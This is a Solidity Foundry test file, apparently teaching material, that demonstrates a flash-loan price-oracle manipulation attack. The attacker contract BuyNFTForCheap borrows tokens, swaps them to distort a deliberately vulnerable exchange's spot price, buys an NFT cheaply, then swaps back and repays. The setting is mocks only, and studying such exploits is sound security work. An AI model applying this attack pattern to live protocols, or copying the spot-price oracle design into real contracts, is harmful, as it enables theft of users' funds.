// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {BadExchange} from "../src/BadExchange.sol";
import {Test, console2} from "forge-std/Test.sol";
import {MockUSDC} from "./MockUSDC.sol";
import {MockWETH} from "./MockWETH.sol";
import {OracleManipulation} from "../src/OracleManipulation.sol";
import {FlashLoaner} from "../src/FlashLoaner.sol";
import {IFlashLoanReceiver} from "../src/IFlashLoanReceiver.sol";
import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

contract BadExchangeTest is Test {
    OracleManipulation public oracleManipulation;
    BadExchange public badExchange;
    FlashLoaner public flashLoaner;

    MockUSDC public mockUSDC;
    MockWETH public mockWETH;

    uint256 startingUsdc = 100e27;
    uint256 startingWeth = 1e27;

    uint256 flashLoanerStartingToken = 50e27;

    address user = makeAddr("user");
    address liquidityProvider = makeAddr("liquidityProvidier");

    function setUp() public {
        mockUSDC = new MockUSDC();
        mockWETH = new MockWETH();

        vm.deal(address(mockWETH), 100e18);

        badExchange = new BadExchange(
            address(mockUSDC),
            address(mockWETH),
            "LiquidToken",
            "LT"
        );

        oracleManipulation = new OracleManipulation(address(badExchange));
        flashLoaner = new FlashLoaner(address(mockUSDC));
        mockUSDC.mint(address(flashLoaner), flashLoanerStartingToken);

        vm.startPrank(liquidityProvider);
        mockUSDC.mint(liquidityProvider, startingUsdc);
        mockUSDC.approve(address(badExchange), startingUsdc);
        mockWETH.mint(liquidityProvider, startingWeth);
        mockWETH.approve(address(badExchange), startingWeth);
        badExchange.deposit(startingWeth, startingUsdc);
        vm.stopPrank();
    }

    function testStartingPrice() public {
        uint256 expectedPrice = 1e18;
        uint256 delta = 1e16;
        assertApproxEqAbs(
            oracleManipulation.getEthPriceOfNft(),
            expectedPrice,
            delta
        );
        console2.log(oracleManipulation.getEthPriceOfNft());
    }

    // function testAbsolute() public {
    //     uint256 number1 = 10;
    //     uint256 number2 = 21;
    //     uint256 delta = 10;

    //     assertApproxEqAbs(number1, number2, delta);
    // }

    function testNormallyItCostsIethToBuyNft() public {
        uint256 amount = 1e17;
        vm.deal(user, amount);
        vm.prank(user);
        vm.expectRevert();
        oracleManipulation.buyNft{value: amount}();
    }

    function testFlashLoanBreaksIt() public {
        BuyNFTForCheap buyNft = new BuyNFTForCheap(
            address(oracleManipulation),
            address(flashLoaner),
            address(badExchange),
            address(mockWETH),
            address(mockUSDC)
        );

        mockUSDC.mint(address(buyNft), 50e18);
        buyNft.doFlashLoan();

        assertEq(oracleManipulation.balanceOf(address(buyNft)), 1);
    }
}

contract BuyNFTForCheap is IFlashLoanReceiver, ERC721Holder {
    OracleManipulation oracleManipulation;
    FlashLoaner flashloaner;
    BadExchange badExchange;
    MockWETH weth;
    MockUSDC usdc;
    uint256 flashloanerStartingToken = 50e27;

    constructor(
        address _oracleManipulaition,
        address _flashLoaner,
        address _badExchange,
        address _weth,
        address _usdc
    ) {
        oracleManipulation = OracleManipulation(_oracleManipulaition);
        flashloaner = FlashLoaner(_flashLoaner);
        badExchange = BadExchange(_badExchange);
        weth = MockWETH(_weth);
        usdc = MockUSDC(_usdc);
    }

    function doFlashLoan() public {
        flashloaner.flashloan(flashloanerStartingToken);
    }

    function execute() public payable {
        console2.log(
            "price of the NFT start at:",
            oracleManipulation.getEthPriceOfNft()
        );
        usdc.approve(address(badExchange), flashloanerStartingToken);
        badExchange.swapExactInput(usdc, flashloanerStartingToken, weth);
        uint256 nftPrice = oracleManipulation.getEthPriceOfNft();
        console2.log("Price of the Nft is now", nftPrice);
        weth.approve(address(weth), nftPrice);
        weth.withdraw(nftPrice);

        oracleManipulation.buyNft{value: nftPrice}();
        weth.approve(address(badExchange), weth.balanceOf(address(this)));
        badExchange.swapExactInput(weth, weth.balanceOf(address(this)), usdc);
        usdc.transfer(address(flashloaner), flashloanerStartingToken);
    }

    receive() external payable {}
}
